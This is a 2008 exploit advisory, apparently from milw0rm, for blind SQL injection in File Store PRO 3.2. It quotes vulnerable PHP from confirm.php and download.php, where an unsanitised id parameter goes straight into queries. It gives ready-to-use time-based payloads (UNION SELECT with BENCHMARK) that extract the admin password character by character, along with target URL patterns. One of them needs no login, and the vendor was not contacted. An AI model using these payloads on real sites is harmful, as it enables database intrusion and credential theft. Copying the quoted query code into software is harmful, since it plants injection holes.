@@ -1,0 +1,115 @@
+ ________________________________________
+| File Store PRO 3.2 Blind SQL Injection |
+|________________________________________|
+
+
+Download from: http://upoint.info/cgi/demo/fs/filestore.zip
+
+- Need admin rights:
+/confirm.php:
+[code]
+
+if(isset($_GET["folder"]) && $_GET["folder"]!="") {
+ $folder=$_GET["folder"];
+} else {
+  exit("Bad Request");
+ }
+if(isset($_GET["id"]) && $_GET["id"]!="") {
+ $id=$_GET["id"];
+} else {
+  exit("Bad Request");
+ }
+
+// Validate all inputs
+// Added by SepedaTua on June 01, 2006 - http://www.sepedatua.info/
+/********************** SepedaTua ****************************/
+
+/* Fields:
+$folder
+$id
+*/
+$search = array ('@<script[^>]*?>.*?</script>@si',
+                '@<[\/\!]*?[^<>]*?>@si',
+                '@([\r\n])[\s]+@',
+                '@&(quot|#34);@i',
+                '@&(amp|#38);@i',
+                '@&(lt|#60);@i',
+                '@&(gt|#62);@i',
+                '@&(nbsp|#160);@i',
+                '@&(iexcl|#161);@i',
+                '@&(cent|#162);@i',
+                '@&(pound|#163);@i',
+                '@&(copy|#169);@i',
+                '@&#(\d+);@e');
+
+$replace = array ('',
+                 '',
+                 '\1',
+                 '"',
+                 '&',
+                 '<',
+                 '>',
+                 ' ',
+                 chr(161),
+                 chr(162),
+                 chr(163),
+                 chr(169),
+                 'chr(\1)');
+
+$ffolder = $folder;
+$fid = $id;
+
+$folder = preg_replace($search, $replace, $folder);
+$id = preg_replace($search, $replace, $id); 
+
+-----
+
+$SQL="SELECT `".DB_PREFIX."users`.*, `".DB_PREFIX."file_list`.`filename`, `".DB_PREFIX."file_list`.`descript` ";
+$SQL.=" FROM `".DB_PREFIX."file_list` LEFT JOIN `".DB_PREFIX."users` ON `".DB_PREFIX."file_list`.`user_id`=`".DB_PREFIX."users`.`id`";
+$SQL.=" WHERE `".DB_PREFIX."file_list`.`id`='".$id."'";
+if(!$mysql->query($SQL))
+{
+ exit($mysql->error);
+}
+if($mysql->num<=0)
+{
+ exit("Record not found");
+} 
+[/code]
+
+POC: 
+' UNION SELECT IF (SUBSTRING(password, 1, 1)='a', BENCHMARK(100000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from fstore_users where login='admin 
+Site: http://site.xxx/confirm.php?folder=a&id=[SQL]
+
+- Don't need admin rights:
+In /download.php:
+[code]
+if(!isset($_GET["sig"])) // direct download, no need to login
+$MustLogin=1|2|4;
+require_once("libs/header.php");
+if(!isset($_GET["sig"])) // direct download, no need to login
+$userlevel=$CurUser->getlevel();
+$SQL="SELECT * FROM `".DB_PREFIX."file_list` WHERE `id`='".$fileid."'";
+if(!$mysql->query($SQL))
+{
+ exit($mysql->error);
+} 
+[/code]
+
+POC:
+' UNION SELECT IF (SUBSTRING(password, 1, 1)='a', BENCHMARK(100000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11 from fstore_users where login='admin
+Site: 
+http://site.xxx/download.php?id=[SQL] 
+
+Needs magic_quotes_gpc=off. Vendor not contacted !
+
+--------------------------------------------------------------------
+
+Site: http://rstcenter.com
+Site: http://de-ce.net
+
+Good luck !
+
+--------------------------------------------------------------------
+
+# milw0rm.com [2008-07-11]
